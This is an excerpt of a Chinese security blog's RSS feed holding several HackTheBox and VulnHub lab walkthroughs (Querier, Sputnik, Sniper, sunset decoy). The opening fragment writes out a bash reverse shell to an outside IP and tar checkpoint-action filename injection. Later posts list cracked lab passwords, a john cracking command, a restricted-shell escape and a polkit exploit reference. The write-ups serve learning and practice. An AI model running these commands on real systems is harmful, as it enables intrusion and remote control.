&lt;p&gt;重置了一下机器，然后这次我加上了引号就可以了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.5.66/8899 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&amp;gt;1.sh
touch &amp;#34;/var/www/html/--checkpoint-action=exec=&amp;#39;sh 1.sh&amp;#39;&amp;#34;
touch &amp;#34;/var/www/html/--checkpoint=1&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdc5bc44ab35b6d27bcd2826b13b455c1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5bbb080e1c1016fd7bb1b8bce5c06292%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X034 Querier</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x034-querier/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x034-querier/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc2717bb159fbd9f01be8956292b90b01image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf5892ddf82aac0abf2a1a26cb399cf97image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6f9de32208211aadbf0563a45c011cfbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：445、1433、5985&lt;/p&gt;
&lt;p&gt;445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa4313eb9098171061865f00046ed4d3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：Luis&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE79b050ac91ab01092e5a2f356f179652image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不知道为啥，打开是空的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6972a42e706e1d8e28bfbc761afa1715image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是在windows中打开，发现好像是存在宏：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20058768812ccb032c9d77dc357dceabimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用unzip工具进行提取即可，在提取出来的文件中，可以发现：&lt;/p&gt;
&lt;p&gt;reporting&lt;/p&gt;
&lt;p&gt;PcwTWTHRwryjc$c6&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacfdd31640226a545cdc7aac5ec6adbfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2645d847fb0ba9683418e008d9f8a268image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;xp_cmd无法开启，试着中继了hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe4c3fa49ff4d10b6a0229088f2fb9326image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解成功：&lt;/p&gt;
&lt;p&gt;corporate568     (mssql-svc)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd95c95fba89cec4719cb6873eb751b7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是登录失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6c179ac5ea28ad2a0a9fe13a61ed64d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试psexec，也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a4c206b15df931e7c084fc0208ca632image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用新的账户登录MSSQL：&lt;/p&gt;
&lt;p&gt;xp_cmd开启成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb59b637dc5aaada4c8e8111d337c35c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过smb共享，反弹shell回来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5a42c25c9604d7fc6daef3e974af42fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;winpe,&lt;/p&gt;
&lt;p&gt;看起来是打了补丁的，但还是看一下有没有比较好提权的把：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6980fc50ca65e6e95890cb5887e988c7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像没有，看看其他的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2beb04540ad6d45b006dac833e985fecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单查了一下，好像是可以提权的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8293bbd2cc028f37bc552d77eade6d6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0eb0cfe25d2a337ca4cafc19b1e53ccimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73a46b63097aabd443f5dfa829704e42image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;psexec，成功了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa6258c6dd99b0c4f2c0b9ffed6ebeb76image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x034 Sputnik 1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x034-sputnik-1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x034-sputnik-1-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4e40d195b7a91574331b069e0ff75b22%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE145236ecce5b7c10a067371b943cdf5a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4ec6eb8ba5277c38092995f5b1e178f5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;这台靶机的端口很奇葩，而且三个HTTP，直接开始吧&lt;/p&gt;
&lt;p&gt;先把看看nday漏洞，但是没发现有用的东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE44c937b5d91911c0a0f738206cf2e69c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;目录扫描发现有用的东西了.git目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE105babf9c7ca7af157473f369427329e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;稍微研究一下这个东西怎么利用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE75d700fbf7dd5ac0d410e58dd266b34f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;到这里就误入歧途了，通过工具翻查了半天，然后没找到有用东西，最后无奈看了WP，提示信息在这个文件里面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb68a060896131d786c841ffe45949e79%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;当时看过这个文件，然后看到了ROOT，但是一想没有开放ssh端口，所以就没管，没想到是因为克隆的其他人仓库导致的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6a1e5a5757e8e8ca4558c20ce46777b8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后把其他人的仓库克隆下来，再查看日志：&lt;/p&gt;
&lt;p&gt;git log -p&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8dc1c87f6fbc9f9f0ed81ddf5f13aaf5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不过要吐槽一下，这谁知道是账号密码啊，难不成标准格式就长这样？&lt;/p&gt;
&lt;p&gt;+sputnik:ameer_says_thank_you_and_good_job&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1b02d91bba0cea95ad565527cbf7f34e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录后台：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE988a1f40ac2ec781a44c71a411a06f17%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;到这里就可以用已知漏洞了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8045bf7cde54279b8a9c879c005e4116%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里需要处理一下pip2的问题：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2 get-pip.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE114203728c63af1c0dcfe0a4e6f0f674%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后下载模块：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa9ff4adbb4dc1abf9f500736a45bf20e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着下载依赖：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfa3c4633e94e01218c4f0da8da0693a2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8d7f8c200a47ff8eb8e4420f52a42db4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7ad0feac33962d493006c2d3466ab8fc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE68edc12a743e5e98b2d4250e1ea1729a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改一下代码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE53f2d2ec4ea87c219629c6c3499d0475%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3da457feb327417cd2f4651c00c83f29%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;秒了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcd4529348a7956f70436a5c780863d5f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3513a6ba57ac13425ab9cb4eca585f81%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X035 Sniper</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x035-sniper/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x035-sniper/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20b61384be2dcd3300751271b979708fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94818edea997aaa6c02110672ea8a3e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE32f6533e95fc2a071e14a07191136763image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注端口：80、445：&lt;/p&gt;
&lt;p&gt;445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE561c3c4f7e0f862188ee76a9da3fa392image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3e935eb2a42bcede5cdca66ad468fb72image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0854af8da2254fde4e8682825de83667image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb4e4391a1d22e7fc62bec8c352c7efe8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过测试远程文件包含不存在，那么该如何getshell呢？&lt;/p&gt;
&lt;p&gt;读取session文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE715f79d4a6643651f118b5bb71966cb8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现里面有我们的名字，于是，我们可以在这里面写入webshell，反弹shell:&lt;/p&gt;
&lt;p&gt;大概就是传入nc，然后反弹：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEea4b53a25034134e89de1cd3c119e533image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据库账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5e49f988b69e8b1621324f9b2e7114ebimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个密码是Chris用户的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEca5132517c6753321883ec10b92a0450image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用powershell弹个Chris的shell回来：&lt;/p&gt;
&lt;p&gt;直接调用temp里面的失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE61c9060dafa18695af5b56a0b89e8839image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;得重新下一个到Chris的目录里面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE99c632406bcb6160a0721975c2ae5c93image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;常规提权思路无果，需要信息收集：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE03f9e29a5be930b0cb46796178fa777cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;其实这里的意思是，让我们做一个帮助文档，然后会有人查看这个文档，结合downloads里面的chm文档，上面应该放置的就是这个文档，我们需要利用chm做一个payload：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb7cca88758e4558e97a83032bc41616aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后续使用htmlhelp.exe来进行制作，然后就可以获取到administrator的ntlmhash进行破解即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70e8271e92b629901057130b90db7884image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x035 sunset decoy</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x035-sunset-decoy/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x035-sunset-decoy/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE099bd507449b73081ce8f37bb0c3b667%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4ed549d6c8935a50f5a62ae9788818d1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE712433f17ff09c37753a77f69697e0a3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;目录扫描没发现东西，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd227bd235445cdae1bb35ab4796d32e4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEba3ec5c726f1c67862a1026106044d8f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看了一下，是目录浏览，没有继续扫的必要了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7cefd82800ac58b0887f66f81d8f9155%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;需要密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE56ddbc7b1f25e43d175564d98016075b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE059f6a976e7736b356a4c26d5a786783%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE99d9883f9e9f42e234f6d84c8558e272%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;shadow账号就这两个，破解一下试试把：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd0117c14613feb84e5fe4ddf79949c34%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破shadow密码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;john shadow --format=crypt --wordlist=/usr/share
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出现密码:&lt;/p&gt;
&lt;p&gt;296640a3b825115a47b68fc44501c828&lt;/p&gt;
&lt;p&gt;server&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5249ccc4c52791fa67f13347c10e98f2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5ac0ac186ebba33b81881c96ed937cfb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;上来发现是受限的shell，想办法逃逸一下：&lt;/p&gt;
&lt;p&gt;发现文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_43168364/article/details/111830233&#34;&gt;https://blog.csdn.net/qq_43168364/article/details/111830233&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sh 296640a3b825115a47b68fc44501c828@192.168.5.101 &amp;#34;bash --noprofile&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb8036cbe20c42bf6425eef9ca19517b3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;一个哑shell，升级成交互式shell，然后环境变量又没了，恢复一下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcdeb4b007f8bf7bdb104ae14a4a7f48a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;SUID和sudo无果，有GCC，来个内核提权吧：&lt;/p&gt;
&lt;p&gt;CVE-2021-4034秒了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8bf37b242e62ef6b76bfc2232d2e165c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X036 BreadCrumbs</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70be77fb5ef93b8149102fb00a072d05image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe8715c473c00666e0051e4bfffdde548image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE29b677e2297d8725770835b3ff84dbf4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf06af7d090a1110fa2f7e891703eac51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得注意的服务：ssh\http\smb\mysql&lt;/p&gt;
&lt;p&gt;smb：&lt;/p&gt;
